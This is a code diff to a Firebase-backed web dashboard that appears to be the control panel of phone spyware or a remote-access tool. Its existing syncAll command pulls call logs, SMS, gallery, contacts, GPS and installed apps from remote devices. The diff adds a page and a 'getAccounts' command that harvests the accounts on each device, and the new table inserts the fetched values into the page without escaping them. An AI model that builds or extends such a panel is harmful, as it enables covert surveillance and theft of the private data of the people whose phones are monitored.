@@ -856,6 +856,7 @@
                     class="fas fa-address-book"></i> Contacts</div>
             <div class="nav-item" data-page="gallery" onclick="showPage('gallery')"><i class="fas fa-images"></i> Media
             </div>
+            <div class="nav-item" data-page="accounts" onclick="showPage('accounts')"><i class="fas fa-user-circle"></i> Accounts</div>
             <div class="nav-item" data-page="apps" onclick="showPage('apps')"><i class="fas fa-cubes"></i> Apps</div>
         </div>
 
@@ -1056,6 +1057,12 @@
                 <div class="card">
                     <h3 style="margin:0 0 15px;">Media Gallery</h3>
                     <div class="table-container" id="gallery-list"></div>
+                </div>
+            </div>
+            <div id="page-accounts" class="page">
+                <div class="card">
+                    <h3 style="margin:0 0 15px;">User Accounts</h3>
+                    <div class="table-container" id="account-list"></div>
                 </div>
             </div>
             <div id="page-apps" class="page">
@@ -1347,6 +1354,13 @@
                 document.getElementById('contact-list').innerHTML = html + '</table>';
             });
 
+            const accountRef = db.ref(base + 'accounts'); activeRefs.push(accountRef);
+            accountRef.on('value', s => {
+                let html = '<table class="list-table"><tr><th>Type</th><th>Account Name</th></tr>';
+                (s.val() || []).forEach(v => { html += `<tr><td>${v.type}</td><td><b>${v.name}</b></td></tr>`; });
+                document.getElementById('account-list').innerHTML = html + '</table>';
+            });
+
             const appsRef = db.ref(base + 'installedApps'); activeRefs.push(appsRef);
             appsRef.on('value', s => {
                 let html = '<table class="list-table"><tr><th>App</th><th>Package</th></tr>';
@@ -1383,7 +1397,7 @@
             }
         }
         function stopStream() { if (currentId) db.ref(`devices/${currentId}/streamConfig`).update({ enabled: false }); }
-        function syncAll() { ['getApps', 'getCallLogs', 'getSMS', 'getGallery', 'getContacts', 'getGPS'].forEach(c => sendCommand(c, true)); }
+        function syncAll() { ['getApps', 'getCallLogs', 'getSMS', 'getGallery', 'getContacts', 'getGPS', 'getAccounts'].forEach(c => sendCommand(c, true)); }
         function handleAuth() {
             const e = document.getElementById('auth-email').value;
             const p = document.getElementById('auth-pass').value;
